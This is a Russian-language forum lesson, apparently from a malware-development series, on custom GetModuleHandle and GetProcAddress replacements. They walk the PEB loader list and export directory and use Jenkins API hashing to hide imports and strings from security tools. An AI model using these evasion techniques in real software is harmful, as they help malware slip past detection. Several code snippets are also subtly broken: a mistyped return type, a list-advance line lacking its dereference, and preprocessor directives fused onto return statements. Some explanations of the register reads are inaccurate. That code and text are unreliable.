Изображение ниже показывает результаты обеих функций GetProcAddress и GetProcAddressReplacement, ищущих адрес NtAllocateVirtualMemory. Как ожидалось, оба результата указывают на правильный адрес функции, и поэтому успешно была создана пользовательская реализация GetProcAddress.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784788708.png"
		data-src="https://osint42.org/attachments/1746784788708-png.182/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784788708-png.182/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784788708.png"
			title="1746784788708.png"
			width="818" height="468" loading="lazy" />
	</div><br />
<br />
<b>Теперь давайте попробуем реализовать функцию GetModuleHandle</b><br />
<br />
Функция GetModuleHandle извлекает дескриптор для указанной DLL. Функция возвращает дескриптор к DLL или NULL, если DLL не существует в вызывающем процессе.<br />
<br />
В этом модуле будет реализована функция, которая заменит GetModuleHandle.<br />
<br />
Прототип новой функции показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName){}</code></pre>
	</div>
</div><br />
<b>Как работает GetModuleHandle</b><br />
<br />
Тип данных HMODULE - это базовый адрес загруженной DLL, который указывает, где DLL расположена в адресном пространстве процесса. Следовательно, цель функции-заменителя - извлечь базовый адрес указанной DLL.<br />
<br />
Блок окружения процесса (PEB) содержит информацию о загруженных DLL, в частности, член PEB_LDR_DATA Ldr структуры PEB.<br />
<br />
Таким образом, начальный шаг - получить доступ к этому члену через структуру PEB.<br />
<br />
<b>PEB в 64-битных системах</b><br />
<br />
Напомним, что указатель на структуру PEB находится в структуре блока окружения потока (TEB).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784806412.png"
		data-src="https://osint42.org/attachments/1746784806412-png.183/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784806412-png.183/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784806412.png"
			title="1746784806412.png"
			width="1085" height="100" loading="lazy" />
	</div><br />
<br />
В 64-битных системах смещение к указателю структуры TEB хранится в регистре GS. Следующее изображение из x64dbg.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784813497.png"
		data-src="https://osint42.org/attachments/1746784813497-png.184/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784813497-png.184/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784813497.png"
			title="1746784813497.png"
			width="1378" height="132" loading="lazy" />
	</div><br />
<br />
<b>Метод 1: Извлечение PEB в 64-битных системах</b><br />
<br />
Существуют два разных способа извлечения PEB. Первый метод включает в себя извлечение структуры TEB, а затем получение указателя на PEB. Этот подход можно выполнить с помощью макроса __readgsqword(0x30) в Visual Studio, который считывает 0x30 байт из регистра GS, чтобы достичь указателя на структуру TEB.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Метод 1
PTEB pTeb = (PTEB)__readgsqword(0x30);
PPEB pPeb = (PPEB)pTeb-&gt;ProcessEnvironmentBlock;</code></pre>
	</div>
</div><br />
<b>Метод 2: Извлечение PEB в 64-битных системах </b><br />
<br />
Следующий метод извлекает структуру PEB напрямую, пропуская структуру TEB, используя макрос __readgsqword(0x60) в Visual Studio, который считывает 0x60 байт из регистра GS.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Метод 2
PPEB pPeb2 = (PPEB)(__readgsqword(0x60));</code></pre>
	</div>
</div><br />
Это можно сделать, потому что элемент ProcessEnvironmentBlock находится на 0x60 (hex) или 96 байтах от начала структуры TEB.<br />
<br />
<b>Метод 1: Извлечение PEB в 32-битных системах.</b><br />
<br />
Так же, как и в 64-битных системах, существуют два способа извлечения PEB.<br />
<br />
Первый метод включает в себя получение структуры TEB, а затем получение структуры PEB с помощью макроса __readfsdword(0x18) в Visual Studio, который считывает 0x18 байт из регистра FS.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Метод 1
PTEB pTeb = (PTEB)__readfsdword(0x18);
PPEB pPeb = (PPEB)pTeb-&gt;ProcessEnvironmentBlock;</code></pre>
	</div>
</div><br />
<b>Метод 2: Извлечение PEB в 32-битных</b> <b>системах</b><br />
<br />
Второй метод получает PEB напрямую, пропуская структуру TEB, используя макрос __readfsdword(0x30) в Visual Studio, который считывает 0x30 байт из регистра FS.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Метод 2
PPEB pPeb2 = (PPEB)(__readfsdword(0x30));</code></pre>
	</div>
</div><br />
0x30 (hex) это 48 байт, которые являются смещением элемента ProcessEnvironmentBlock от 32-битной структуры TEB. Тип данных PVOID составляет 4 байта в 32-битных системах.<br />
<br />
<b>Перечисление DLL</b><br />
<br />
После извлечения структуры PEB следующий шаг - получить доступ к члену PEB_LDR_DATA Ldr. Напомним, что этот член содержит информацию о загруженных DLL в процессе.<br />
<br />
<b>Структура PEB_LDR_DATA</b><br />
<br />
Структура PEB_LDR_DATA показана ниже. Важным членом этой структуры является LIST_ENTRY InMemoryOrderModuleList.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PEB_LDR_DATA {
BYTE Reserved1[8];
PVOID Reserved2[3];
LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;</code></pre>
	</div>
</div><br />
<b>Структура LIST_ENTRY</b><br />
Структура LIST_ENTRY, показанная ниже, представляет собой двусвязный список, который по сути аналогичен массивам, но упрощает доступ к соседним элементам.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _LIST_ENTRY {
struct _LIST_ENTRY *Flink;
struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</code></pre>
	</div>
</div><br />
Двусвязные списки используют элементы Flink и Blink в качестве указателей на начало и конец списка соответственно. Это означает, что Flink указывает на следующий узел в списке, тогда как элемент Blink указывает на предыдущий узел в списке. Эти указатели используются для перемещения по связанному списку в обоих направлениях. Зная это, чтобы начать перечисление этого списка, следует начать с доступа к его первому элементу, InMemoryOrderModuleList.Flink.<br />
<br />
Согласно определению Microsoft для члена InMemoryOrderModuleList, указывается, что каждый элемент в списке является указателем на структуру LDR_DATA_TABLE_ENTRY.<br />
<br />
<b>Структура LDR_DATA_TABLE_ENTRY</b><br />
 <br />
Структура LDR_DATA_TABLE_ENTRY представляет собой DLL внутри связанного списка загруженных DLL для процесса. Каждый LDR_DATA_TABLE_ENTRY представляет собой уникальную DLL.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _LDR_DATA_TABLE_ENTRY {
PVOID Reserved1[2];
LIST_ENTRY InMemoryOrderLinks; // двусвязный список, содержащий порядок загрузки модулей в память
PVOID Reserved2[2];
PVOID DllBase;
PVOID EntryPoint;
PVOID Reserved3;
UNICODE_STRING FullDllName; // структура &#039;UNICODE_STRING&#039;, содержащая имя файла загруженного модуля
BYTE Reserved4[8];
PVOID Reserved5[3];
union {
ULONG CheckSum;
PVOID Reserved6;
};
ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</code></pre>
	</div>
</div><br />
<b>Логика реализации</b><br />
<br />
На основе всего вышеупомянутого требуются следующие действия:<br />
<br />
1. Извлечь PEB<br />
2. Извлечь член Ldr из PEB<br />
3. Извлечь первый элемент в связанном списке<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName) {

// Получение peb
#ifdef _WIN64 // если компиляция как x64
PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // если компиляция как x32
PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif// Получение Ldr
PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);

// Получение первого элемента в связанном списке, который содержит информацию о первом модуле
PLDR_DATA_TABLE_ENTRY    pDte    = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);
}</code></pre>
	</div>
</div><br />
Поскольку каждый pDte представляет собой уникальную DLL внутри связанного списка, возможно перейти к следующему элементу с помощью следующей строки кода:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>pDte = (PLDR_DATA_TABLE_ENTRY)(pDte);</code></pre>
	</div>
</div><br />
Эта строка кода может показаться сложной, но все, что она делает - это разыменовывает значение, хранящееся по адресу, на который указывает pDte, а затем приводит результат к указателю на структуру PLDR_DATA_TABLE_ENTRY. Это просто так работают связанные списки, что-то вроде следующего изображения.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784848050.png"
		data-src="https://osint42.org/attachments/1746784848050-png.185/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784848050-png.185/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784848050.png"
			title="1746784848050.png"
			width="1078" height="322" loading="lazy" />
	</div><br />
<br />
<b>Перечисление DLL - код</b><br />
Приведенный ниже фрагмент кода извлекает имя DLL, уже загруженных в вызывающий процесс. Функция ищет целевой модуль, szModuleName. Если совпадение найдено, функция возвращает дескриптор к DLL (HMODULE), в противном случае - возвращает NULL.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>MODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName) {

// Получение PEB
#ifdef _WIN64 // если компиляция как x64
PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // если компиляция как x32
PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif// Получение Ldr
PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);

// Получение первого элемента в связанном списке, который содержит информацию о первом модуле
PLDR_DATA_TABLE_ENTRY    pDte    = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

while (pDte) {
    // Если не null
    if (pDte-&gt;FullDllName.Length != NULL) {
           // Вывод имени DLL
        wprintf(L&quot;[i] \&quot;%s\&quot; \n&quot;, pDte-&gt;FullDllName.Buffer);
    }
    else {
        break;
    }
    // Следующий элемент в связанном списке
    pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
}

return NULL;
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746784859105.png"
		data-src="https://osint42.org/attachments/1746784859105-png.186/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784859105-png.186/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784859105.png"
			title="1746784859105.png"
			width="1363" height="253" loading="lazy" />
	</div><br />
<br />
<b>Чувствительность имен DLL к регистру</b><br />
<br />
Изучив вывод, можно легко заметить, что некоторые имена DLL написаны заглавными буквами, а некоторые - нет, что влияет на возможность получения базового адреса DLL (HMODULE). Например, если кто-то ищет DLL KERNEL32.DLL и передает Kernel32.DLL, функция wcscmp будет рассматривать обе строки как разные.<br />
<br />
Чтобы устранить эту проблему, была создана вспомогательная функция IsStringEqual, которая принимает две строки, преобразует их в представление в нижнем регистре, а затем сравнивает их в этом состоянии. Она возвращает true, если обе строки равны, и false в противном случае.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>BOOL IsStringEqual (IN LPCWSTR Str1, IN LPCWSTR Str2) {

WCHAR   lStr1    [MAX_PATH],
        lStr2    [MAX_PATH];

int        len1    = lstrlenW(Str1),
        len2    = lstrlenW(Str2);

int        i        = 0,
        j        = 0;

// Проверка длины. Не хотим переполнить буферы
if (len1 &gt;= MAX_PATH || len2 &gt;= MAX_PATH)
    return FALSE;

// Преобразование Str1 в строку в нижнем регистре (lStr1)
for (i = 0; i &lt; len1; i++){
    lStr1[i] = (WCHAR)tolower(Str1[i]);
}
lStr1[i++] = L&#039;\0&#039;; // завершение null

// Преобразование Str2 в строку в нижнем регистре (lStr2)
for (j = 0; j &lt; len2; j++) {
    lStr2[j] = (WCHAR)tolower(Str2[j]);
}
lStr2[j++] = L&#039;\0&#039;; // завершение null

// Сравнение строк в нижнем регистре
if (lstrcmpiW(lStr1, lStr2) == 0)
    return TRUE;

return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Базовый адрес DLL</b><br />
<br />
Получение базового адреса DLL требует ссылки на структуру LDR_DATA_TABLE_ENTRY. К сожалению, в официальной документации Microsoft отсутствуют большие фрагменты структуры. Поэтому, чтобы лучше понять структуру, <a href="https://www.nirsoft.net/kernel_struct/vista/index.html" target="_blank" class="link link--external" rel="noopener">был проведен поиск структур ядра Windows Vista.</a> Результаты для структуры можно найти <a href="https://www.nirsoft.net/kernel_struct/vista/LDR_DATA_TABLE_ENTRY.html" target="_blank" class="link link--external" rel="noopener">здесь.</a><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _LDR_DATA_TABLE_ENTRY {
LIST_ENTRY InLoadOrderLinks;
LIST_ENTRY InMemoryOrderLinks;
LIST_ENTRY InInitializationOrderLinks;
PVOID DllBase;
PVOID EntryPoint;
ULONG SizeOfImage;
UNICODE_STRING FullDllName;
UNICODE_STRING BaseDllName;
ULONG Flags;
WORD LoadCount;
WORD TlsIndex;
union {
LIST_ENTRY HashLinks;
struct {
PVOID SectionPointer;
ULONG CheckSum;
};
};
union {
ULONG TimeDateStamp;
PVOID LoadedImports;
};
PACTIVATION_CONTEXT EntryPointActivationContext;
PVOID PatchInformation;
LIST_ENTRY ForwarderLinks;
LIST_ENTRY ServiceTagLinks;
LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;</code></pre>
	</div>
</div><br />
<b>Базовый адрес DLL</b> - это InInitializationOrderLinks.Flink, хотя имя этого не предполагает, но, <b><u>к сожалению, Microsoft любит сбивать с толку людей.</u></b> Сравнив этот член с официальной документацией Microsoft по LDR_DATA_TABLE_ENTRY, можно увидеть, что базовый адрес DLL - это зарезервированный элемент (Reserved2[0]).<br />
<br />
С этим в виду, функция-заменитель GetModuleHandle может быть завершена.<br />
<br />
<b>Функция-заменитель GetModuleHandle</b><br />
<br />
GetModuleHandleReplacement - это функция, которая заменяет GetModuleHandle. Она будет искать заданное имя DLL, и если оно загружено процессом, возвращает дескриптор к DLL.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName) {

// Получение PEB
#ifdef _WIN64 // если компиляция как x64
PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // если компиляция как x32
PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif// Получение Ldr
PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
// Получение первого элемента в связанном списке (содержит информацию о первом модуле)
PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

while (pDte) {

    // Если не null
    if (pDte-&gt;FullDllName.Length != NULL) {

        // Проверка на равенство
        if (IsStringEqual(pDte-&gt;FullDllName.Buffer, szModuleName)) {
            wprintf(L&quot;[+] Найдена Dll \&quot;%s\&quot; \n&quot;, pDte-&gt;FullDllName.Buffer);
#ifdef LDR_DATA_TABLE_ENTRY return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);
#else return (HMODULE)pDte-&gt;Reserved2[0];
#endif // STRUCTS}

        // wprintf(L&quot;[i] \&quot;%s\&quot; \n&quot;, pDte-&gt;FullDllName.Buffer);
    }
    else {
        break;
    }

    // Следующий элемент в связанном списке
    pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

}

return NULL;
}</code></pre>
	</div>
</div><br />
Одна часть кода, которая не была объяснена, показана ниже. Эта часть кода определяет, используется ли версия структуры LDR_DATA_TABLE_ENTRY от Microsoft или та, что из структур ядра Windows Vista. В зависимости от того, какая из них была использована, имя члена меняется.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#ifdef LDR_DATA_TABLE_ENTRY return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);
#else return (HMODULE)pDte-&gt;Reserved2[0];
#endif // STRUCTS</code></pre>
	</div>
</div><br />
<b>Демо</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784884136.png"
		data-src="https://osint42.org/attachments/1746784884136-png.187/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784884136-png.187/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784884136.png"
			title="1746784884136.png"
			width="1108" height="535" loading="lazy" />
	</div><br />
<br />
Вот мы написали две функции GetProcAddressReplacement и GetModuleHandleReplacement, которые заменяли GetProcAddress и GetModuleHandle. Этого достаточно для выполнения Run-Time Dynamic Linking, что скрывает импортированные функции от IAT. Однако строки, используемые в коде, показывают, какие функции используются. Например, строка ниже использует функции для извлечения VirtualAllocEx.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>GetProcAddressReplacement(GetModuleHandleReplacement(&quot;ntdll.dll&quot;),&quot;VirtualAllocEx&quot;)</code></pre>
	</div>
</div><br />
Решения безопасности легко могут извлекать строки из скомпилированного двоичного файла и распознавать, что используется VirtualAllocEx. Чтобы решить эту проблему, к обеим функциям GetProcAddressReplacement и GetModuleHandleReplacement будет применен алгоритм хэширования строк. Вместо выполнения строковых сравнений для получения указанного базового адреса модуля или адреса функции, функции будут работать с хеш-значениями.<br />
<br />
<b>Реализация JenkinsOneAtATime32Bit</b><br />
<br />
Функции GetProcAddressReplacement и GetModuleHandleReplacement в этом модуле переименованы в GetProcAddressH и GetModuleHandleH соответственно. Эти обновленные функции используют алгоритм хеширования строк Jenkins One At A Time для замены имени функции и модуля на хеш-значение, которое их представляет. Напомним, что этот алгоритм был использован через функцию JenkinsOneAtATime32Bit, которая была представлена в <a href="https://ru-sfera.pw/threads/razrabotka-virusov-25-skrytie-strok.4477" target="_blank" class="link link--external" rel="noopener">уроке скрытия строк.</a><br />
<br />
<b>Хеширование строк</b><br />
<br />
Чтобы использовать функции, показанные в этой статье, необходимо получить хеш-значение имени модуля (например, User32.dll) и хеш-значение имени функции (например, MessageBoxA). Это можно сделать, сначала выводя хешированные значения на консоль. Убедитесь, что алгоритм хеширования использует ту же начальную точку.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main(){
printf(&quot;[i] Хеш &quot;%s&quot; : 0x%0.8X \n&quot;, &quot;USER32.DLL&quot;, HASHA(&quot;USER32.DLL&quot;)); // Имя модуля в верхнем регистре
printf(&quot;[i] Хеш &quot;%s&quot; : 0x%0.8X \n&quot;, &quot;MessageBoxA&quot;, HASHA(&quot;MessageBoxA&quot;));

return 0;
}</code></pre>
	</div>
</div><br />
Вышеуказанная основная функция выведет следующее:<br />
<br />
 Хеш &quot;USER32.DLL&quot; : 0x81E3778E<br />
 Хеш &quot;MessageBoxA&quot; : 0xF10E27CA<br />
<br />
Эти хеш-значения теперь можно использовать с функциями ниже.<br />
<br />
<b>Использование </b><br />
<br />
Функции будут использоваться таким же образом, за исключением того, что теперь передается хеш-значение, а не строковое значение.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// 0x81E3778E - это хеш USER32.DLL
// 0xF10E27CA - это хеш MessageBoxA
fnMessageBoxA pMessageBoxA = GetProcAddressH(GetModuleHandleH(0x81E3778E),0xF10E27CA);</code></pre>
	</div>
</div><br />
<b>Функция GetProcAddressH</b><br />
<br />
GetProcAddressH - это функция, эквивалентная GetProcAddressReplacement, основное отличие которой заключается в том, что хеш-значения алгоритма хеширования строк JenkinsOneAtATime32Bit используются для сравнения экспортируемых имен функций с входным хешем.<br />
<br />
Также стоит отметить, что код использует два макроса, чтобы сделать код более чистым и легким для обновления в будущем.<br />
<br />
HASHA - Вызов HashStringJenkinsOneAtATime32BitA (ASCII)<br />
HASHW - Вызов HashStringJenkinsOneAtATime32BitW (UNICODE)<br />
<br />
#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))<br />
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))<br />
<br />
<b>Исходя из этого, GetProcAddressH показан ниже. </b><br />
<br />
Функция принимает два параметра:<br />
<br />
hModule - дескриптор модуля DLL, содержащего функцию.<br />
dwApiNameHash - хеш-значение имени функции, чтобы получить ее адрес.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

if (hModule == NULL || dwApiNameHash == NULL)
    return NULL;

PBYTE pBase = (PBYTE)hModule;

PIMAGE_DOS_HEADER         pImgDosHdr              = (PIMAGE_DOS_HEADER)pBase;
if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
    return NULL;

PIMAGE_NT_HEADERS         pImgNtHdrs              = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
    return NULL;

IMAGE_OPTIONAL_HEADER     ImgOptHdr              = pImgNtHdrs-&gt;OptionalHeader;

PIMAGE_EXPORT_DIRECTORY   pImgExportDir          = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

PDWORD  FunctionNameArray    = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);
PDWORD  FunctionAddressArray    = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);
PWORD   FunctionOrdinalArray    = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
    CHAR*    pFunctionName       = (CHAR*)(pBase + FunctionNameArray[i]);
    PVOID    pFunctionAddress    = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

    // Хеширование каждого имени функции pFunctionName
    // Если оба хеша равны, значит, мы нашли нужную функцию
    if (dwApiNameHash == HASHA(pFunctionName)) {
        return pFunctionAddress;
    }
}

return NULL;
}</code></pre>
	</div>
</div><br />
<b>GetModuleHandleH</b><br />
<br />
Функция GetModuleHandleH такая же, как и GetModuleHandleReplacement, основное отличие состоит в том, что хеш-значения алгоритма хеширования строк JenkinsOneAtATime32Bit будут использоваться для сравнения перечисленных имен DLL с входным хешем.<br />
<br />
Обратите внимание на то, как функция преобразует строку в FullDllName.Buffer в верхний регистр, следовательно, параметр dwModuleNameHash должен быть хеш-значением имени модуля в верхнем регистре (например, USER32.DLL).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {

if (dwModuleNameHash == NULL)
    return NULL;
#ifdef _WIN64
PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif

PPEB_LDR_DATA            pLdr  = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
PLDR_DATA_TABLE_ENTRY    pDte  = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

while (pDte) {

    if (pDte-&gt;FullDllName.Length != NULL &amp;&amp; pDte-&gt;FullDllName.Length &lt; MAX_PATH) {

        // Преобразование `FullDllName.Buffer` в строку верхнего регистра
        CHAR UpperCaseDllName[MAX_PATH];

        DWORD i = 0;
        while (pDte-&gt;FullDllName.Buffer[i]) {
            UpperCaseDllName[i] = (CHAR)toupper(pDte-&gt;FullDllName.Buffer[i]);
            i++;
        }
        UpperCaseDllName[i] = &#039;\0&#039;;

        // хеширование `UpperCaseDllName` и сравнение хеш-значения с тем, что во входном `dwModuleNameHash`
        if (HASHA(UpperCaseDllName) == dwModuleNameHash)
            return pDte-&gt;Reserved2[0];

    }
    else {
        break;
    }

    pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
}

return NULL;
}</code></pre>
	</div>
</div><br />
<b>Демо</b><br />
<br />
